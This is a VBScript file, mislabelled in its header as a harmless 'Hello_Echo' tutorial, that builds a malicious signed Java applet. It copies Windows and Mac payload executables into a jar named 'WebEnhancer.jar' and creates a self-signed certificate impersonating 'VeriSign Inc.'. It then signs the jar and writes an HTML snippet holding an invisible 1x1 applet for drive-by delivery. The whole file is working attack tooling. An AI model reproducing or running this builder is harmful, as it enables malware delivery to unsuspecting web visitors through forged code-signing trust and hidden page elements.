'  Hello_Echo.vbs
'  Copyright (c) 2008 by Dr. Herong Yang, http://www.herongyang.com/

Set oArgs = WScript.Arguments
If oArgs.Length < 3 Then 
	WScript.Echo "No arguments provided!"
	WScript.Echo "Usage: makeapplet <payload> <tempdir> <outputname> [<keystore name> <keystore password> <key alias> <key password>]"
	WScript.Quit 1
End If

Payload = WScript.Arguments.Item(0)
TmpDir = WScript.Arguments.Item(1)
OutputName = WScript.Arguments.Item(2)

WScript.Echo "Selected payload          : " & Payload
WScript.Echo "Using temporary directory : " & TmpDir
WScript.Echo "Output name               : " & OutputName

KeyStore = Null
KeyStorePassword = "store_password"
KeyAlias = "signapplet"
KeyPassword = "key_password"
If oArgs.Length = 7 Then
	KeyStore = WScript.Arguments.Item(3)
	KeyStorePassword = WScript.Arguments.Item(4)
	KeyAlias = WScript.Arguments.Item(5)
	KeyPassword = WScript.Arguments.Item(6)
	WScript.Echo "Keystore                  : " & KeyStore
End If

WScript.Echo

' Check that temporary directory exists
Set objFSO = CreateObject("Scripting.FileSystemObject")
If not objFSO.FolderExists (TmpDir) then
	WScript.Echo "Cannot find temporary directory " & TmpDir
	WScript.Quit 1
End If

' switch current directory to temporary
Set WshShell = CreateObject("WScript.Shell")
WshShell.CurrentDirectory = TmpDir

SignedApplet = OutputName & ".jar"
AppletCertificate = OutputName & ".cer"
PayloadWin = Payload & ".exe"
PayloadMac = Payload
JarFile =  "WebEnhancer.jar"

' delete any signed applet with the same name, if exists
If objFSO.FileExists(SignedApplet) then
	objFSO.DeleteFile(SignedApplet)
End If
	
If not objFSO.FileExists(JarFile) then
	WScript.Echo "Cannot find the base JAR file " & JarFile
	WScript.Quit 1
End If

If not objFSO.FileExists(PayloadWin) then
	WScript.Echo "Cannot find Windows payload file " & PayloadWin
	WScript.Quit 1
End If

If not objFSO.FileExists(PayloadMac) then
	WScript.Echo "Cannot find Mac payload file " & PayloadWin
	WScript.Quit 1
End If

objFSO.CopyFile PayloadWin, "win"
objFSO.CopyFile PayloadMac, "mac"

WScript.Echo "Adding payload to jar file."

WScript.Echo "Embedding Windows payload."
Ret = WshShell.Run("zip -u " & JarFile & " win", 0, true)

WScript.Echo "Embedding Mac payload."
Ret = WshShell.Run("zip -u " & JarFile & " mac", 0, true) 

If IsNull(KeyStore) Then
	KeyStore = "applet_keystore"
	WScript.Echo "Creating certificate."
	Ret = WshShell.Run("keytool -genkey -alias " & KeyAlias & " -dname ""CN=VeriSign Inc., O=Default, C=US"" -validity 18250 -keystore " & KeyStore & " -keypass " & KeyPassword & " -storepass " & KeyStorePassword, 0, true)
	If not objFSO.FileExists(KeyStore) then
		WScript.Echo "Cannot find " & KeyStore
		WScript.Quit 1
	End If
Else
	WScript.Echo "Using provided keystore for signing applet."
End If

WScript.Echo "Signing applet."
Ret = WshShell.Run("jarsigner -keystore " & KeyStore & " -storepass " & KeyStorePassword & " -keypass " & KeyPassword & " -signedjar " & SignedApplet & " " & JarFile & " " & KeyAlias, 0, true)
If not objFSO.FileExists(SignedApplet) then
	WScript.Echo "Cannot find " & SignedApplet
	WScript.Quit 1
End If

WScript.Echo "Exporting certificate."
Ret = WshShell.Run("keytool -export -keystore " & KeyStore & " -storepass " & KeyStorePassword & " -alias " & KeyAlias & " -file " & AppletCertificate, 0, true)
If not objFSO.FileExists(AppletCertificate) then
	WScript.Echo "Cannot find " & AppletCertificate
	WScript.Quit 1
End If

WScript.Echo "Creating HTML snippet."
Set objFile = objFSO.CreateTextFile(OutputName & ".html")
objFile.WriteLine("<applet width='1' height='1' code=WebEnhancer archive='" & SignedApplet & "'></applet>")

WScript.Echo
WScript.Echo "Done."

